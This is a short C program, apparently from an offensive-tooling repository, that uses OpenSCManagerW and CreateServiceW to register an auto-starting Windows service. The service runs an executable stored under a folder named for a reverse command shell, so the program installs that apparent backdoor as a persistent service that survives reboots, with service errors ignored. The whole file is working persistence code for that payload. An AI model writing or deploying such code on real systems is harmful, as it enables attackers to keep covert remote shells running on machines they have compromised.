#include <windows.h>
#include <stdio.h>


//OpenSCManagerW
//CreateServiceW
//Requires UAT

int wmain()
{
	LPCWSTR lpMachineName = NULL;
	LPCWSTR lpDatabaseName = NULL;
	SC_HANDLE openmanager = OpenSCManagerW(lpMachineName, lpDatabaseName, GENERIC_ALL);
	if (openmanager == NULL) {
		printf("Failed to open manager\r\n");
	}
	else {
		printf("Manager opened\r\n");
	}

	LPCWSTR lpServiceName = L"AAAAAAAA";
	LPCWSTR lpDisplayName = L"AAAAAAAA";
	DWORD dwDesiredAccess = GENERIC_ALL;
	DWORD dwServiceType = SERVICE_WIN32_OWN_PROCESS;
	DWORD dwStartType = SERVICE_AUTO_START;
	DWORD dwErrorControl = SERVICE_ERROR_IGNORE;
	LPCWSTR lpBinaryPathName = L"C:\\Users\\user\\Documents\\GitHub\\0ffensived3v\\C-ReverseCMDShellNonProxy\\Debug\\PrometheusTemplateNonProxy.exe";
	LPCWSTR lpLoadOrderGroup = NULL;
	LPDWORD lpdwTagId = NULL;
	LPCWSTR lpDependencies = NULL;
	LPCWSTR lpServiceStartName = NULL;
	LPCWSTR lpPassword = NULL;

	SC_HANDLE createservice = CreateServiceW(openmanager, lpServiceName, lpDisplayName, dwDesiredAccess, dwServiceType, dwStartType, dwErrorControl, lpBinaryPathName, lpLoadOrderGroup, lpdwTagId, lpDependencies, lpServiceStartName, lpPassword);
	if (createservice == NULL) {
		printf("Failed to create service\r\n");
	}
	else {
		printf("Service created\r\n");
	}
}
